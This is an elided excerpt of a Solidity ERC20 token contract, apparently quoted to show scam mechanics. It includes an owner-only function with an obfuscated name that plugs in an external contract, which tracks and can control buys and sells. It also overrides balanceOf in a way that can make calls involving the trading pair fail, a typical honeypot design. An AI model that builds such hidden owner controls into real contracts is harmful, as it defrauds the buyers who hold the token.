...
contract TokenM is ERC20 {
    ...
    IUserAmounttvtcou public tvtcou;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("MOMOERC", "1MOMO") {
	...
	function balanceOf(address account) public override view returns(uint256){
		if(account == uniswapV2Pair){require(super.balanceOf(account) > 0);}
    ...
    function caceoturByingrRfuut(IUserAmounttvtcou _tvtcou) public onlyOwner {
        tvtcou = _tvtcou;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                tvtcou.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				tvtcou.addOutAmount(from, amount);
            }else{
                tvtcou.addOutAmount(from, amount);
                takeFee = false;
            }
